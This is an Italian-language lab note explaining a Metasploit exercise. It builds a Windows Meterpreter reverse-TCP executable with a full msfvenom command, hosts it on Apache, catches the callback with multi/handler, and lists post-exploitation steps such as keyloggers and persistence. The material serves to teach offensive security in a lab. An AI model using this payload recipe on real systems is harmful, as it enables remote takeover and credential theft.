_Tag:_ #cybersecurity  #hacking #metasploit #laboratorio

---
L'attacco inizia con la creazione dell'eseguibile malevolo tramite lo strumento `msfvenom`. Il comando utilizzato è: `sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe > ~/victim.exe`.

### Cosa significa "windows/meterpreter/reverse_tcp"

Questo è il cuore tecnico dell'operazione. Analizziamolo per componenti:

- **Windows**: Indica la piattaforma target (architettura e OS).
- **Reverse TCP**: A differenza di una "Bind Shell" (dove l'attaccante si connette alla vittima), in una **Reverse Shell** è la vittima a iniziare la connessione verso l'attaccante. Questo è fondamentale per superare i firewall, che solitamente bloccano il traffico in entrata ma permettono quello in uscita.
- **Meterpreter**: È il payload più avanzato di [[Exploitation con Metasploit|Metasploit]]. Non è una semplice shell testuale; è un framework di [[Post-Exploitation|post-exploitation]] che risiede interamente in memoria (non scrive file sul disco, aumentando la furtività) e permette il controllo interattivo completo del sistema compromesso.

### Parametri di Rete: LHOST e LPORT

- **LHOST (Local Host)**: L'indirizzo IP della macchina dell'attaccante (es. 192.168.56.1) a cui il malware deve "telefonare".
- **LPORT (Local Port)**: La porta sulla quale l'attaccante rimarrà in ascolto (es. 4444).

## Delivery: Distribuzione tramite Apache

Una volta creato `victim.exe`, il file deve essere consegnato alla vittima. Nell'esercitazione, l'attaccante sposta il file nella directory `/var/www/html/` del proprio server web **Apache**. In questo modo, il malware è raggiungibile tramite un semplice URL HTTP.

### Setup del Listener: exploit/multi/handler

Prima che la vittima esegua il file, l'attaccante deve preparare il "ricevitore".

- Si utilizza il modulo **multi/handler**, un listener generico progettato per gestire le connessioni provenienti da exploit esterni o payload generati manualmente.
- È cruciale impostare lo stesso identico payload (`set payload windows/meterpreter/reverse_tcp`) affinché l'attaccante sappia come interpretare i dati inviati dalla vittima.
- Il comando `exploit` avvia il processo di ascolto sulla porta specificata.

## Esecuzione e Post-Exploitation

Quando l'utente sulla macchina Windows 10 scarica ed esegue il file (previo disinserimento dei sistemi di difesa in ambiente lab):

1. Il file viene eseguito, ma non appare alcuna interfaccia grafica, rendendo l'attacco **stealthy** (furtivo).
2. Il payload invia una richiesta di connessione TCP all'IP dell'attaccante.
3. Metasploit stabilisce una **Sessione**.

### Il potere di Meterpreter

Una volta aperta la sessione, l'attaccante può passare alla modalità `shell` per ottenere il controllo diretto del terminale Windows (cmd.exe). Da qui può:

- Navigare nel file system (es. `C:\Users\User\Downloads>`).
- Installare keylogger per rubare credenziali.
- Cercare di ottenere la **persistenza**, ovvero fare in modo che il malware si riavvii automaticamente al boot del sistema, dato che inizialmente le sessioni sono spesso effimere (temporanee).